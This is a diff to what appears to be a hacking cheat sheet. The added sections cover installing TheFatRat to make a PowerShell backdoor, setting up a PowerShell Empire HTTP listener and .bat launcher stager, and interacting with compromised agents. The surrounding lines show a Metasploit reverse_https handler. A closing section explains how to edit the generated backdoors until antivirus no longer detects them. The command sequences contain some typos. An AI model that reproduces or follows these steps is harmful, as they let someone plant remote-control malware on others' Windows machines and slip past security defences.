@@ -318,8 +318,75 @@ use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_https
 set LHOST 10.10.10.10
 set LPORT 8080
+save
 exploit
 ```
+## TheFatRat
+- https://github.com/Screetsec/TheFatRat
+```
+git clone https://github.com/Screetsec/TheFatRat.git
+cd TheFatRat
+chmod +x setup.sh && ./setup.sh
+```
+Update
+```
+cd TheFatRat
+./update && chmod +x setup.sh && ./setup.sh
+```
+Create Backdoor using PwnWinds  
+backdoor generated with this uses PowerShell. Powershell comes in pre-installed with all Windows machines after Windows 7.
+So you can guarantee that it's going to work on all Windows computers,
+if they're running Windows 7 and up.  
+```
+fatrat
+6
+try diferents like 1
+```
+## Empire (Don't use Metasploit)
+- https://github.com/BC-SECURITY/Empire
+- GUI https://github.com/BC-SECURITY/Starkiller
+	- windows, mac, linux, android 
+	- use encription for the shell
+Generate Listener
+```
+sudo apt install powershell-empire
+- Terminal 1
+powershell-empire server
+- Terminal 2
+powershell-empire client
+help
+uselisteners http
+set Port 8080 
+options
+execute
+terminal 1 > show 1 listener
+back
+```
+Generate Backdor
+```
+- Terminal 2
+usestager widows/launcher_bat
+set Listener http
+set OutFile http8080.bat
+execute
+```
+When we get a shell
+```
+- Terminal 1
+agents
+interact xxxxx
+
+```
+
+## Modifying Backdoor Source To Bypass All Anti-virus Programs
+for the .bat backdors generated whit fatrat and empire (Dos and powershell code)
+Idea:
+- Open backdoor with text editor.
+- Make sure shellcode is not detect, if it then change payload settings or use a different one.
+- Remove all arguments, add them one by one to identify the one triggering AV programs
+- Remove / modify detectable code.
+
+
 ## Trojan Factory
 - https://github.com/z00z/TrojanFactory
 Installation:
